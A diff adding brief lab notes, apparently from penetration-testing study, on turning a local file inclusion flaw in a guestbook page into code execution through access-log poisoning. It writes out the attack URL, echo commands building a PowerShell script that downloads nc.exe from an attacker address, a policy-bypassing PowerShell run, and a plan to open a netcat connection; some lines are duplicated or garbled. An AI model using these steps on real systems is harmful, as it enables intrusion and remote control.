@@ -1,0 +1,19 @@
+1) Code Execution is straightforward in the LFI attack. By modifying the URL to include the following lines of code we are able to create the powershell script used in chapter 10 to download nc.exe. For example this is the last line of the script being added:
+
+http://192.168.17.78/addguestbook.php?name=a&comment=b&cmd=echo $webclient.DownloadFile($url,$file) >>C:\wget.ps1&LANG=../../../../../../../xampp/apache/logs/access.log%00
+
+echo $storageDir = $pwd > wget.ps1
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1 C:\Users\Offsec> echo $url = "http://192.168.16.43/nc.exe" >>wget.ps1 C:\Users\Offsec> echo $file = "new-exploit.exe" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+echo $file = "new-exploit.exe" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+
+
+powershell.exe -ExecutionPolicy Bypass -NoLogo - NonInteractive -NoProfile -File wget.ps1
+
+Using this method we can download netcat to the windows box.
+
+2) Further commands are run to have netcat start listening on an appropriate port for incoming requests
+
+Once this is done we cna proceed with connecting from the attacking machine
+
